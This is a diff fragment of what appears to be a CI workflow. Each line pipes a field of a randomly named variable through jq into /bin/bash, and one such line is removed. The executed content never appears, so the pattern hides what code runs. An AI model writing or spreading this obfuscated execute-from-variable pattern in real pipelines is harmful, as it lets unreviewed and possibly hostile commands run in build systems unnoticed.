@@ -41,7 +41,6 @@ jobs:
           echo $qla5 | jq -r .ha939 | /bin/bash
           printf '%s' "$gnp972" | jq -r .h8993 | /bin/bash
           echo $kypk212 | jq -r .stmzk3 | /bin/bash
-          printf '%s' "$xv5" | jq -r .xal8 | /bin/bash
           printf '%s' "$o25645" | jq -r .ed1 | /bin/bash
           echo $k1873 | jq -r .ghm4108 | /bin/bash
           printf '%s' "$ec04558" | jq -r .acy5027 | /bin/bash
